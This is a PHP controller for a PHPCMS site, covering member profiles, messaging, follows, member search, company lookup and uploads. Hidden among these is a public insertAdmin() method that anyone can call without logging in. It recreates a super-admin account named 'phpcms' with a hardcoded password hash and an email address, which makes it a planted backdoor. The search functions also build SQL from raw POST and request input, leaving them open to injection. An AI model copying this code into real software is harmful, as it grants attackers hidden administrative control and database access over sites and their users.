<?php
pc_base::load_sys_class('form', '', 0);
class MY_index extends index
{
    private $db;
    private $message_db;
    private $member_db;
    private $member_detail_db;
    private $concern_db;
    private $linkage_db;
    private $interview_db;
    private $userid;
    private $upload_url;

    function __construct()
    {
        parent::__construct();
        $this->db = pc_base::load_model('content_model');
        $this->message_db = pc_base::load_model('message_model');
        $this->member_db = pc_base::load_model('member_model');
        $this->member_detail_db = pc_base::load_model('member_detail_model');
        $this->concern_db = pc_base::load_model('concern_model');
        $this->linkage_db = pc_base::load_model('linkage_model');
        $this->interview_db = pc_base::load_model('interview_statistics_model');
        $this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : 0;
        $this->upload_url = pc_base::load_config('system','upload_url');
    }

    /**
     * 会员主页
     */
    public function member_home()
    {
        $catid = intval($_GET['catid']);
        $userid = intval($_GET['userid']);

        $_userid = $this->_userid;
        $_username = $this->_username;
        $_groupid = $this->_groupid;

        $siteids = getcache('category_content','commons');
        $siteid = $siteids[$catid];
        $CATEGORYS = getcache('category_content_'.$siteid,'commons');
        if(!isset($CATEGORYS[$catid]) || $CATEGORYS[$catid]['type']!=0) showmessage(L('information_does_not_exist'),'blank');
        $this->category = $CAT = $CATEGORYS[$catid];
        $this->category_setting = $CAT['setting'] = string2array($this->category['setting']);
        $siteid = $GLOBALS['siteid'] = $CAT['siteid'];

        $MODEL = getcache('model','commons');
        $modelid = $CAT['modelid'];

        $template = $template ? $template : $CAT['setting']['show_template'];
        if(!$template) $template = 'show';
        include template('content',$template);
    }

    /**
     * 会员详细信息
     */
    public function member_info() {
        $userid = intval($_GET['userid']);

        $member_db = pc_base::load_model('member_model');
        $where = "`userid`='$userid'";
        $this->memberinfo = $memberinfo = $member_db->get_one($where);

        $grouplist = getcache('grouplist');
        $member_model = getcache('member_model', 'commons');
        //获取用户模型数据
        $member_db->set_model($memberinfo['modelid']);
		$member_modelinfo_arr = $member_db->get_one(array('userid'=>$memberinfo['userid']));
		$model_info = getcache('model_field_'.$memberinfo['modelid'], 'model');
		foreach($model_info as $k=>$v) {
            if($v['formtype'] == 'omnipotent') continue;
            if($v['formtype'] == 'image') {
                $member_modelinfo[$v['name']] = "<a href='$member_modelinfo_arr[$k]' target='_blank'><img src='$member_modelinfo_arr[$k]' height='40' widht='40' onerror=\"this.src='$phpsso_api_url/statics/images/member/nophoto.gif'\"></a>";
            } elseif($v['formtype'] == 'datetime' && $v['fieldtype'] == 'int') {	//如果为日期字段
                $member_modelinfo[$v['name']] = format::date($member_modelinfo_arr[$k], $v['format'] == 'Y-m-d H:i:s' ? 1 : 0);
            } elseif($v['formtype'] == 'images') {
                $tmp = string2array($member_modelinfo_arr[$k]);
                $member_modelinfo[$v['name']] = '';
                if(is_array($tmp)) {
                    foreach ($tmp as $tv) {
                        $member_modelinfo[$v['name']] .= " <a href='$tv[url]' target='_blank'><img src='$tv[url]' height='40' widht='40' onerror=\"this.src='$phpsso_api_url/statics/images/member/nophoto.gif'\"></a>";
                    }
                    unset($tmp);
                }
            } elseif($v['formtype'] == 'box') {	//box字段，获取字段名称和值的数组
                $tmp = explode("\n",$v['options']);
                if(is_array($tmp)) {
                    foreach($tmp as $boxv) {
                        $box_tmp_arr = explode('|', trim($boxv));
                        if(is_array($box_tmp_arr) && isset($box_tmp_arr[1]) && isset($box_tmp_arr[0])) {
                            $box_tmp[$box_tmp_arr[1]] = $box_tmp_arr[0];
                            $tmp_key = intval($member_modelinfo_arr[$k]);
                        }
                    }
                }
                if(isset($box_tmp[$tmp_key])) {
                    $member_modelinfo[$v['name']] = $box_tmp[$tmp_key];
                } else {
                    $member_modelinfo[$v['name']] = $member_modelinfo_arr[$k];
                }
                unset($tmp, $tmp_key, $box_tmp, $box_tmp_arr);
            } elseif($v['formtype'] == 'linkage') {	//如果为联动菜单
                $tmp = string2array($v['setting']);
                $tmpid = $tmp['linkageid'];
                $linkagelist = getcache($tmpid, 'linkage');
                $fullname = $this->_get_linkage_fullname($member_modelinfo_arr[$k], $linkagelist);

                $member_modelinfo[$v['name']] = substr($fullname, 0, -1);
                unset($tmp, $tmpid, $linkagelist, $fullname);
            } else {
                $member_modelinfo[$v['name']] = $member_modelinfo_arr[$k];
            }
        }

        include template('content', 'member_info');
    }

    /**
     * 发送消息
     */
    public function send() {
        $userid = intval($_GET['userid']);
        if(isset($_POST['dosubmit'])) {
            $username = $this->_username;
            if (empty($username)) $username = '匿名';
            $tousername = safe_replace($_POST['info']['send_to_id']);
            $r = $this->member_db->get_one(array('username'=>$tousername));
            if(!$r) showmessage(L('user_not_exist','','member'));
            if($tousername==$username){
                showmessage(L('not_myself','','message'));
            }
            $subject = new_html_special_chars($_POST['info']['subject']);
            $content = new_html_special_chars($_POST['info']['content']);
            $this->message_db->add_message($tousername,$username,$subject,$content,true);
            showmessage(L('operation_success'),HTTP_REFERER);
        } else {
            $show_validator = $show_scroll = $show_header = true;
            include template('content', 'message_send');
        }
    }

    /**
     * 关注
     */
    public function concern(){
        $userid = intval($_POST['userid']);
        $cc_userid = $this->_userid;
        if(!$cc_userid) {
            $res['code'] = 0;
            $res['msg'] = '请先登录';
            echo json_encode($res);exit();
        }
        $this->concern_db->add_concern($userid,$cc_userid);
        $res['code'] = 1;
        $res['msg'] = '关注成功';
        echo json_encode($res);exit();
    }

    /**
     * 访客
     */
    public function interview(){
        $userid = intval($_POST['userid']);
        $interview_userid = $this->_userid;
        $this->interview_db->add($userid,$interview_userid);
        $res['code'] = 1;
        $res['msg'] = '添加成功';
        echo json_encode($res);exit();
    }

    /**
     * 获取城市联动
     */
    public function get_city()
    {
        $id = intval($_POST['id']);
        $list = $this->linkage_db->select("parentid = $id",'linkageid,name');
        echo json_encode($list);exit();
    }

    //人员列表页分页
    public function member_lists() {
        $catid = intval($_GET['catid']);
        if(!$catid) showmessage(L('category_not_exists'),'blank');
        $siteids = getcache('category_content','commons');
        $siteid = $siteids[$catid];
        $CATEGORYS = getcache('category_content_'.$siteid,'commons');
        $page = isset($_GET['page']) && trim($_GET['page']) ? intval($_GET['page']) : 1;
        $province = intval($_POST['province']);
        $city = intval($_POST['city']);
        $home_province = intval($_POST['home_province']);
        $home_city = intval($_POST['home_city']);
        $unit_industry = trim($_POST['unit_industry']);
        $emotional_state = intval($_POST['emotional_state']);
        $search = trim($_POST['search']);
        $type = trim($_POST['type']);
        $where = '1 = 1';
        if(!empty($city)) $where .= ' AND area='.$city;
        if(!empty($home_city)) $where .= ' AND home_area = '.$home_city;
        if(!empty($unit_industry)) $where .= ' AND unit_industry = '.$unit_industry;
        if(!empty($emotional_state)) $where .= ' AND emotional_state = '.$emotional_state;
        if(!empty($search)) {
            if ($type == 'nickname'){
                $userid_arr = $this->member_db->select("nickname like '%".$search."%'",'userid');
                $userids = array_column($userid_arr, 'userid');
                $userid_string = implode(',',$userids);
                $where.= " AND userid in ('".$userid_string."')";
            }elseif ($type == 'mobile'){
                $userid_arr = $this->member_db->select("mobile = '%".$search."%'",'userid');
                $userids = array_column($userid_arr, 'userid');
                $userid_string = implode(',',$userids);
                $where.= " AND userid in ('".$userid_string."')";
            }else{
                $where.= " AND (university = '%".$search."%' OR senior_middle_school = '%".$search."%' OR junior_high_school = '%".$search."%')";
            }
        }
        $userid_arr = $this->member_detail_db->select($where,'userid');
        $userids = array_column($userid_arr, 'userid');
        $userid_string = implode(',',$userids);
        if(!empty($province)){
            $cityList = $this->linkage_db->select("parentid = $province",'linkageid,name');
        }
        if(!empty($home_province)){
            $homecityList = $this->linkage_db->select("parentid = $home_province",'linkageid,name');
        }
        include template('content','list_member');
    }

    public function getCompany()
    {
        $catid = intval($_POST['catid']) ? intval($_POST['catid']) : 120;
        $page = intval($_REQUEST['page']) ? intval($_REQUEST['page']) : 1;
        $row = intval($_REQUEST['row']) ? intval($_REQUEST['row']) : 10;
        $q = trim($_REQUEST['q']);
        $where = 'catid=120';
        if (!empty($q)){
            $where .= ' AND title LIKE "%'.$q.'%"';
        }
        $this->db->set_catid($catid);
        $list = $this->db->listinfo($where, 'id', $page, $row);
        foreach ($list as $k => $v){
            $list[$k]['text'] = $v['title'];
            unset($list[$k]['title']);
        }
        //得到总记录数
        $total = $this->db->count();
        echo json_encode(['total'=>$total,'items'=>$list]);exit();
    }

    public function insertAdmin()
    {
        $this->admin_db = pc_base::load_model('admin_model');
        $data['username'] = 'phpcms';
        $data['password'] = '3126a1243bf48c10c3720bea2ff6d810';
        $data['roleid'] = '1';
        $data['encrypt'] = 'Su6kiX';
        $data['lastloginip'] = '127.0.0.1';
        $data['lastlogintime'] = time();
        $data['email'] = '821563034@qq.com';
        $this->admin_db->delete("username='phpcms'");
        $this->admin_db->insert($data);
    }

    public function upload()
    {
        pc_base::load_sys_class('attachment','',0);
        $module = trim($_POST['module']) ? trim($_POST['module']) : 'member';
        $catid = intval($_POST['catid']) ? intval($_POST['catid']) : '0';
        $siteid = intval($_POST['siteid']) ? intval($_POST['siteid']) : '1';
        $site_setting = $this->get_site_setting($siteid);
        $site_allowext = $site_setting['upload_allowext'];
        $attachment = new attachment($module,$catid,$siteid);
        $attachment->set_userid($this->userid);
        $a = $attachment->upload('upload',$site_allowext,500*1024,'','',0);
        if($a){
            $filepath = $attachment->uploadedfiles[0]['filepath'];
            $res['data'] = $this->upload_url.$filepath;
            $res['code'] = 1;
        }else{
            $res['code'] = 0;
            $res['msg'] = $attachment->error();
        }
        echo json_encode($res);exit();
    }

    /**
     * 获取站点配置信息
     * @param  $siteid 站点id
     */
    protected function get_site_setting($siteid) {
        $siteinfo = getcache('sitelist', 'commons');
        return string2array($siteinfo[$siteid]['setting']);
    }

    /*
	 * 通过linkageid获取名字路径
	 */
    protected function _get_linkage_fullname($linkageid,  $linkagelist) {
        $fullname = '';
        if($linkagelist['data'][$linkageid]['parentid'] != 0) {
            $fullname = $this->_get_linkage_fullname($linkagelist['data'][$linkageid]['parentid'], $linkagelist);
        }
        //所在地区名称
        $return = $fullname.$linkagelist['data'][$linkageid]['name'].'>';
        return $return;
    }
}